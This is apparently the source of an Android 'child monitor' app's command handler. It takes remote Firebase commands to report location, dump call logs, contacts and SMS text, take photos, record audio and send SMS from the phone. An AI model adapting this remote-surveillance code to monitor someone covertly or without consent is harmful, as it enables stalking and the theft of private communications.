package com.childmonitorai;
import com.childmonitorai.models.Command;


import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import android.provider.CallLog;
import android.content.ContentResolver;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.net.Uri;
import android.provider.Telephony;
import android.os.Vibrator;
import android.graphics.Bitmap;
import android.view.Surface;
import android.view.View;
import android.app.Activity;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import java.io.ByteArrayOutputStream;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

import android.os.Handler;
import android.os.Looper;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.os.UserManager;
import android.os.Process;
import android.provider.Settings;

public class CommandExecutor {
    private static final String TAG = "CommandExecutor";
    private DatabaseReference mDatabase;
    private String userId;
    private String deviceId;
    private Context context;
    private FirebaseStorageHelper storageHelper;
    private CameraHelper cameraHelper;

    public CommandExecutor(String userId, String deviceId, Context context) {
        this.userId = userId;
        this.deviceId = deviceId;
        this.context = context;
        this.mDatabase = FirebaseDatabase.getInstance().getReference();
        this.storageHelper = new FirebaseStorageHelper();
        this.cameraHelper = new CameraHelper(context, userId, deviceId, storageHelper, this::updateCommandStatus);
    }


    public void executeCommand(Command command, String date, String timestamp) {
        if (command == null) return;

        String commandName = command.getCommand();
        Log.d(TAG, "Executing command: " + commandName);

        try {
            switch (commandName) {
                case "get_location":
                    fetchLocation(date, timestamp);
                    break;
                case "recover_calls":
                    String phoneNumber = command.getParam("phone_number", "unknown");
                    int dataCount = Integer.parseInt(command.getParam("data_count", "15"));
                    recoverCalls(date, timestamp, phoneNumber, dataCount);
                    break;
                case "retrieve_contacts":
                    retrieveContacts(date, timestamp);
                    break;
                case "recover_sms":
                    phoneNumber = command.getParam("phone_number", "unknown");
                    dataCount = Integer.parseInt(command.getParam("data_count", "15"));
                    recoverSms(date, timestamp, phoneNumber, dataCount);
                    break;
                case "vibrate":
                    int duration = Integer.parseInt(command.getParam("duration", "1")) * 1000; // Convert seconds to milliseconds
                    vibratePhone(date, timestamp, duration);
                    break;
                case "take_picture":
                    String cameraType = command.getParam("camera", "rear");
                    boolean useFlash = Boolean.parseBoolean(command.getParam("flash", "false"));
                    takePicture(date, timestamp, cameraType, useFlash);
                    break;
                case "record_audio":
                    duration = Integer.parseInt(command.getParam("duration", "1")); // Duration in minutes
                    recordAudio(date, timestamp, duration);
                    break;
                case "send_sms":
                    phoneNumber = command.getParam("phone_number", "");
                    String message = command.getParam("message", "");
                    sendSms(date, timestamp, phoneNumber, message);
                    break;
                default:
                    updateCommandStatus(date, timestamp, "failed", "Unknown command: " + commandName);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error executing command: " + commandName, e);
            updateCommandStatus(date, timestamp, "failed", "Error: " + e.getMessage());
        }
    }

    private void fetchLocation(String date, String timestamp) {
        if (ActivityCompat.checkSelfPermission(context,
                android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "Location permission not granted");
            return;
        }

        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (locationManager == null) {
            updateCommandStatus(date, timestamp, "failed", "Location service unavailable");
            return;
        }

        try {
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                String result = String.format(Locale.US, "Latitude: %.6f, Longitude: %.6f",
                        location.getLatitude(), location.getLongitude());
                updateCommandStatus(date, timestamp, "completed", result);
            } else {
                updateCommandStatus(date, timestamp, "failed", "Unable to get location");
            }
        } catch (SecurityException e) {
            updateCommandStatus(date, timestamp, "failed", "Location permission denied");
        }
    }

    private void recoverCalls(String date, String timestamp, String phoneNumber, int dataCount) {
        if (ActivityCompat.checkSelfPermission(context,
                android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "Call log permission not granted");
            return;
        }

        ContentResolver contentResolver = context.getContentResolver();
        String selection = "unknown".equals(phoneNumber) ? null : CallLog.Calls.NUMBER + "=?";
        String[] selectionArgs = "unknown".equals(phoneNumber) ? null : new String[]{phoneNumber};

        try (Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.DATE,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.DURATION
                },
                selection,
                selectionArgs,
                CallLog.Calls.DATE + " DESC")) {

            if (cursor == null) {
                updateCommandStatus(date, timestamp, "failed", "Unable to access call logs");
                return;
            }

            int numberIndex = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            int dateIndex = cursor.getColumnIndex(CallLog.Calls.DATE);
            int typeIndex = cursor.getColumnIndex(CallLog.Calls.TYPE);
            int durationIndex = cursor.getColumnIndex(CallLog.Calls.DURATION);

            if (numberIndex == -1 || dateIndex == -1 || typeIndex == -1 || durationIndex == -1) {
                updateCommandStatus(date, timestamp, "failed", "Missing required call log fields");
                return;
            }

            StringBuilder result = new StringBuilder();
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            int count = 0;

            while (cursor.moveToNext() && count < dataCount) {
                String number = cursor.getString(numberIndex);
                long callDate = cursor.getLong(dateIndex);
                int callType = cursor.getInt(typeIndex);
                int duration = cursor.getInt(durationIndex);

                result.append("Call ").append(count + 1).append(":\n")
                        .append("Number: ").append(number).append("\n")
                        .append("Date: ").append(dateFormat.format(new Date(callDate))).append("\n")
                        .append("Type: ").append(getCallTypeString(callType)).append("\n")
                        .append("Duration: ").append(duration).append(" seconds\n\n");

                count++;
            }

            String finalResult = count > 0 ? result.toString() :
                    "No call logs found" + ("unknown".equals(phoneNumber) ? "" : " for " + phoneNumber);
            updateCommandStatus(date, timestamp, "completed", finalResult);

        } catch (Exception e) {
            updateCommandStatus(date, timestamp, "failed", "Error accessing call logs: " + e.getMessage());
        }
    }

    private void retrieveContacts(String date, String timestamp) {
        if (ActivityCompat.checkSelfPermission(context,
                android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "Contacts permission not granted");
            return;
        }

        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cursor == null) {
            updateCommandStatus(date, timestamp, "failed", "Unable to access contacts");
            return;
        }

        int idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
        int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);

        if (idIndex == -1 || nameIndex == -1) {
            updateCommandStatus(date, timestamp, "failed", "Missing required contact fields");
            cursor.close();
            return;
        }

        StringBuilder result = new StringBuilder();
        int count = 0;

        while (cursor.moveToNext()) {
            String contactId = cursor.getString(idIndex);
            String name = cursor.getString(nameIndex);

            Cursor phones = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                    new String[]{contactId}, null);

            if (phones != null) {
                int phoneNumberIndex = phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

                if (phoneNumberIndex == -1) {
                    updateCommandStatus(date, timestamp, "failed", "Missing required phone number field");
                    phones.close();
                    cursor.close();
                    return;
                }

                while (phones.moveToNext()) {
                    String phoneNumber = phones.getString(phoneNumberIndex);
                    result.append("Contact ").append(count + 1).append(":\n")
                            .append("Name: ").append(name).append("\n")
                            .append("Phone Number: ").append(phoneNumber).append("\n\n");
                    count++;
                }

                phones.close();
            }
        }

        cursor.close();

        String finalResult = count > 0 ? result.toString() : "No contacts found";
        updateCommandStatus(date, timestamp, "completed", finalResult);
    }

    private void recoverSms(String date, String timestamp, String phoneNumber, int dataCount) {
        if (ActivityCompat.checkSelfPermission(context,
                android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "SMS permission not granted");
            return;
        }

        ContentResolver contentResolver = context.getContentResolver();
        String selection = "unknown".equals(phoneNumber) ? null : Telephony.Sms.ADDRESS + "=?";
        String[] selectionArgs = "unknown".equals(phoneNumber) ? null : new String[]{phoneNumber};

        try (Cursor cursor = contentResolver.query(
                Uri.parse("content://sms"),
                new String[]{
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.DATE,
                        Telephony.Sms.BODY,
                        Telephony.Sms.TYPE
                },
                selection,
                selectionArgs,
                Telephony.Sms.DATE + " DESC")) {

            if (cursor == null) {
                updateCommandStatus(date, timestamp, "failed", "Unable to access SMS logs");
                return;
            }

            int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
            int typeIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);

            if (addressIndex == -1 || dateIndex == -1 || bodyIndex == -1 || typeIndex == -1) {
                updateCommandStatus(date, timestamp, "failed", "Missing required SMS fields");
                return;
            }

            StringBuilder result = new StringBuilder();
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            int count = 0;

            while (cursor.moveToNext() && count < dataCount) {
                String address = cursor.getString(addressIndex);
                long smsDate = cursor.getLong(dateIndex);
                String body = cursor.getString(bodyIndex);
                int type = cursor.getInt(typeIndex);

                result.append("SMS ").append(count + 1).append(":\n")
                        .append("Address: ").append(address).append("\n")
                        .append("Date: ").append(dateFormat.format(new Date(smsDate))).append("\n")
                        .append("Type: ").append(getSmsTypeString(type)).append("\n")
                        .append("Body: ").append(body).append("\n\n");

                count++;
            }

            String finalResult = count > 0 ? result.toString() :
                    "No SMS logs found" + ("unknown".equals(phoneNumber) ? "" : " for " + phoneNumber);
            updateCommandStatus(date, timestamp, "completed", finalResult);

        } catch (Exception e) {
            updateCommandStatus(date, timestamp, "failed", "Error accessing SMS logs: " + e.getMessage());
        }
    }

    private void vibratePhone(String date, String timestamp, int duration) {
        Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator == null || !vibrator.hasVibrator()) {
            updateCommandStatus(date, timestamp, "failed", "Vibrator service unavailable");
            return;
        }

        vibrator.vibrate(duration);
        updateCommandStatus(date, timestamp, "completed", "Phone vibrated for " + (duration / 1000) + " seconds");
    }

    private void takePicture(String date, String timestamp, String cameraType, boolean useFlash) {
        cameraHelper.takePicture(date, timestamp, cameraType, useFlash);
    }

    private void recordAudio(String date, String timestamp, int durationMinutes) {
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.RECORD_AUDIO) 
                != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "Audio recording permission not granted");
            return;
        }

        try {
            int sampleRate = 44100;
            int channelConfig = android.media.AudioFormat.CHANNEL_IN_MONO;
            int audioFormat = android.media.AudioFormat.ENCODING_PCM_16BIT;

            int bufferSize = android.media.AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat);
            android.media.AudioRecord recorder = new android.media.AudioRecord(
                android.media.MediaRecorder.AudioSource.MIC,
                sampleRate,
                channelConfig,
                audioFormat,
                bufferSize
            );

            byte[] audioData = new byte[bufferSize * (sampleRate / 1000) * durationMinutes * 60];
            recorder.startRecording();
            updateCommandStatus(date, timestamp, "recording", "Recording started for " + durationMinutes + " minutes");

            new Thread(() -> {
                try {
                    int totalRead = 0;
                    long endTime = System.currentTimeMillis() + (durationMinutes * 60 * 1000);

                    while (System.currentTimeMillis() < endTime && totalRead < audioData.length) {
                        int read = recorder.read(audioData, totalRead, 
                            Math.min(bufferSize, audioData.length - totalRead));
                        if (read > 0) totalRead += read;
                    }

                    recorder.stop();
                    recorder.release();

                    // Trim the array to actual size
                    byte[] trimmedData = new byte[totalRead];
                    System.arraycopy(audioData, 0, trimmedData, 0, totalRead);

                    storageHelper.uploadAudio(userId, deviceId, trimmedData, date, timestamp, 
                        new FirebaseStorageHelper.AudioCallback() {
                            @Override
                            public void onSuccess(String downloadUrl) {
                                updateCommandStatus(date, timestamp, "completed", downloadUrl);
                            }

                            @Override
                            public void onFailure(String error) {
                                updateCommandStatus(date, timestamp, "failed", 
                                    "Failed to upload audio: " + error);
                            }
                        });

                } catch (Exception e) {
                    updateCommandStatus(date, timestamp, "failed", 
                        "Error during audio recording: " + e.getMessage());
                }
            }).start();

        } catch (Exception e) {
            updateCommandStatus(date, timestamp, "failed", 
                "Failed to initialize audio recording: " + e.getMessage());
        }
    }

    private void sendSms(String date, String timestamp, String phoneNumber, String message) {
        if (ActivityCompat.checkSelfPermission(context,
                android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            updateCommandStatus(date, timestamp, "failed", "SMS permission not granted");
            return;
        }

        if (phoneNumber == null || phoneNumber.isEmpty() || message == null || message.isEmpty()) {
            updateCommandStatus(date, timestamp, "failed", "Invalid phone number or message");
            return;
        }

        try {
            android.telephony.SmsManager smsManager = android.telephony.SmsManager.getDefault();
            ArrayList<String> parts = smsManager.divideMessage(message);
            
            // Create pending intents for sent and delivery
            String SENT = "SMS_SENT_" + timestamp;
            String DELIVERED = "SMS_DELIVERED_" + timestamp;

            ArrayList<PendingIntent> sentPendingIntents = new ArrayList<>();
            ArrayList<PendingIntent> deliveredPendingIntents = new ArrayList<>();

            for (int i = 0; i < parts.size(); i++) {
                PendingIntent sentPI = PendingIntent.getBroadcast(context, 0,
                        new Intent(SENT), PendingIntent.FLAG_IMMUTABLE);
                PendingIntent deliveredPI = PendingIntent.getBroadcast(context, 0,
                        new Intent(DELIVERED), PendingIntent.FLAG_IMMUTABLE);
                
                sentPendingIntents.add(sentPI);
                deliveredPendingIntents.add(deliveredPI);
            }

            // Register for SMS sent status
            context.registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context arg0, Intent arg1) {
                    switch (getResultCode()) {
                        case Activity.RESULT_OK:
                            updateCommandStatus(date, timestamp, "completed", 
                                "SMS sent successfully to " + phoneNumber);
                            break;
                        default:
                            updateCommandStatus(date, timestamp, "failed", 
                                "Failed to send SMS: " + getResultCode());
                            break;
                    }
                    context.unregisterReceiver(this);
                }
            }, new IntentFilter(SENT), Context.RECEIVER_NOT_EXPORTED);

            // Send the SMS
            smsManager.sendMultipartTextMessage(phoneNumber, null, parts, 
                sentPendingIntents, deliveredPendingIntents);

            updateCommandStatus(date, timestamp, "sending", 
                "Sending SMS to " + phoneNumber + "...");

        } catch (Exception e) {
            updateCommandStatus(date, timestamp, "failed", 
                "Error sending SMS: " + e.getMessage());
        }
    }

    private String getCallTypeString(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE: return "Incoming";
            case CallLog.Calls.OUTGOING_TYPE: return "Outgoing";
            case CallLog.Calls.MISSED_TYPE: return "Missed";
            case CallLog.Calls.VOICEMAIL_TYPE: return "Voicemail";
            case CallLog.Calls.REJECTED_TYPE: return "Rejected";
            case CallLog.Calls.BLOCKED_TYPE: return "Blocked";
            default: return "Unknown";
        }
    }

    private String getSmsTypeString(int type) {
        switch (type) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "Inbox";
            case Telephony.Sms.MESSAGE_TYPE_SENT: return "Sent";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "Draft";
            case Telephony.Sms.MESSAGE_TYPE_OUTBOX: return "Outbox";
            case Telephony.Sms.MESSAGE_TYPE_FAILED: return "Failed";
            case Telephony.Sms.MESSAGE_TYPE_QUEUED: return "Queued";
            default: return "Unknown";
        }
    }

private void updateCommandStatus(String date, String timestamp, String status, String result) {
    DatabaseReference commandRef = mDatabase.child("users").child(userId)
            .child("phones").child(deviceId).child("commands")
            .child(date).child(timestamp);

    commandRef.child("status").setValue(status);
    if (result != null) {
        commandRef.child("result").setValue(result);
    }
}
}